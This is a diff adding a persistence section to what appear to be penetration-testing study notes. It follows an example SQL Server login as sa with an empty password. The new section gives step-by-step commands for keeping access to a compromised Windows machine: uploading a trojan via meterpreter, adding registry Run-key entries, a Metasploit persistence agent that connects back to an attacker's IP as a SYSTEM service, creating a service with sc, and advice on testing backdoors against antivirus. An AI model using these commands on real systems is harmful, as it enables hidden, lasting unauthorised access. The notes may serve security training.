@@ -236,3 +236,47 @@ OSQL Syntax:
 		-o outputfile
 Example: osql -U sa -P "" -S 192.168.0.5 -Q "select @@version"
 
+
+
+-------------------------------------------------------------------------------------
+Persistence 
+
+Why persistence
+- You might lose your session
+- You might be discovered
+exploit/windows/local/persistence - Works on Windows XP and Windows 7, only works when specific user logs on, sessions dies when user logs out
+The manual method - drop your own trojan, edit the registry to run your trojan on login
+	- Generate a custom payload
+	- From a meterpreter session use the "upload" command to stage the file on the victim
+	- use the reg command to query the current programs launched on login
+	- use the reg command to create a registry string to run your payload on login
+		- reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /t reg_sz <string_name> /d "<file_path>"
+
+Reg command syntax
+	- reg setval (sets the registry value)
+	- -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+		- the registry key path
+	- -v Proxy
+		- the registry value name
+	- -d c:\\Windows\\proxy88.exe
+		- the data to store in the registry value
+	- reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Proxy -d c:\\Windows\\proxy88.exe
+
+Syntax
+- run persistence
+- -S   // Automatically start the agent on boot as a service (with SYSTEM  
+privileges)          
+- -i ## //The interval in seconds between each connection attempt
+- -p ## //The port on the remote host where Metasploit is listening 
+- -r #.#.#.# //The IP of the system running Metasploit listening for the connect    
+back
+
+"SC" command syntax
+- sc create "servicename" //Creates a service with the specified name
+	- binpath= C:\pathtofile\file.exe //Tells the service where the executable resides
+	- start= auto //Sets the startup type (auto/manual/disabled)
+	- DisplayName= "displayname" //Self-explanatory
+Tricks of the Trade
+	- Test backdoor program against antivirus
+	- Test backdoor for visibility at runtime
+	- Try to blend-in...don't try to hide
